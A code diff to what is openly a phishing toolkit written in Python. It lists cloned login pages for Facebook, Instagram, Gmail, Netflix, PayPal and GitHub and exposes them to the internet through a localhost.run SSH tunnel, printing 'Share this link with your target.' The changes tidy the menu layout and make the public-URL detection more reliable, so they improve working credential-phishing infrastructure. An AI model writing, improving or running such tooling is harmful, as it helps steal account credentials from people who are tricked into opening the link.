@@ -14,7 +14,7 @@ from datetime import datetime
 # ========== COLORS ==========
 R = '\033[91m'          # Red
 B = '\033[96m'          # Electric Blue (for other elements)
-DB = '\033[1;34m'       # Bold Dark Blue (for tunnel logo)
+DB = '\033[34m'         # Dark Blue (non-bold, for tunnel logo)
 O = '\033[93m'          # Orange
 G = '\033[92m'          # Green
 Y = '\033[93m'          # Yellow
@@ -49,14 +49,14 @@ def show_main_logo():
 
 def show_tunnel_logo():
     os.system('clear' if os.name == 'posix' else 'cls')
-    print(f"{DB}")   # Bold Dark Blue
+    print(f"{DB}")   # Dark Blue
     print("██████  █████  ██████  ██   ██ ████████ ███████  █████  ██████")
     print("██   ██ ██   ██ ██   ██ ██  ██     ██    ██      ██   ██ ██   ██")
     print("██   ██ ███████ ██████  █████      ██    █████   ███████ ██████")
     print("██████  ██   ██ ██   ██ ██   ██    ██    ███████ ██   ██ ██   ██")
     print(f"{RS}\n")
 
-# ========== PAGE LIST (TWO COLUMNS) ==========
+# ========== PAGE LIST (TWO COLUMNS, with extra spacing) ==========
 PAGES = [
     ("01", "Facebook"), ("02", "Instagram"), ("03", "Gmail"),
     ("04", "Netflix"), ("05", "PayPal"), ("06", "GitHub"),
@@ -76,14 +76,18 @@ def show_page_menu():
     half = len(PAGES) // 2
     left = PAGES[:half]
     right = PAGES[half:]
+    # Print in two columns with two spaces after each bracket
     for i in range(len(left)):
         l_num, l_name = left[i]
         r_num, r_name = right[i] if i < len(right) else ("", "")
-        l_str = f"  {O}[{l_num}]{W} {l_name:20}{RS}"
+        # Left column: two spaces after the closing bracket
+        left_str = f"  {O}[{l_num}]{W}  {l_name:20}{RS}"
         if r_num:
-            print(l_str + f"  {O}[{r_num}]{W} {r_name}{RS}")
+            # Right column: also two spaces after bracket
+            right_str = f"  {O}[{r_num}]{W}  {r_name}{RS}"
+            print(left_str + right_str)
         else:
-            print(l_str)
+            print(left_str)
     print(f"\n{R}" + "═"*60 + f"{RS}")
 
 def find_page_file(choice, page_name):
@@ -150,29 +154,40 @@ def start_localhost_run(port=8080):
             bufsize=1
         )
         url_found = False
-        print(f"{B}[i] Tunnel output:{RS}")
+        url = None
+        print(f"{B}[i] Tunnel output (waiting for URL):{RS}")
+        start_time = time.time()
+        timeout = 15  # seconds to wait for URL before warning
         while not url_found:
+            # Check if process is still alive
+            if proc.poll() is not None:
+                print(f"{R}[-] SSH process terminated unexpectedly.{RS}")
+                break
+            # Read a line (non‑blocking with short timeout)
             line = proc.stdout.readline()
             if not line:
-                # Process might have exited
-                break
+                # No output yet, sleep a bit
+                time.sleep(0.2)
+                # Timeout warning
+                if time.time() - start_time > timeout:
+                    print(f"{Y}[!] Still waiting for URL... (tunnel may be slow){RS}")
+                    start_time = time.time()  # reset timer to avoid spam
+                continue
             print(line.strip())
             # Look for a line containing https:// and .localhost.run
             if "https://" in line and ".localhost.run" in line:
-                # Extract URL (usually the last word, but sometimes embedded)
                 parts = line.strip().split()
                 for part in parts:
                     if part.startswith("https://") and ".localhost.run" in part:
                         url = part
                         break
-                else:
-                    # Fallback: take the whole line
-                    url = line.strip()
+                if url is None:
+                    url = line.strip()  # fallback
                 print(f"\n{G}[+] Public URL: {DB}{url}{RS}")
                 print(f"{Y}[!] Share this link with your target.{RS}\n")
                 url_found = True
         if not url_found:
-            print(f"{Y}[!] Could not extract URL. Check above.{RS}")
+            print(f"{Y}[!] Could not automatically detect the URL. Please look for it in the output above.{RS}")
         return proc
     except Exception as e:
         print(f"{R}[-] Tunnel failed: {e}{RS}")
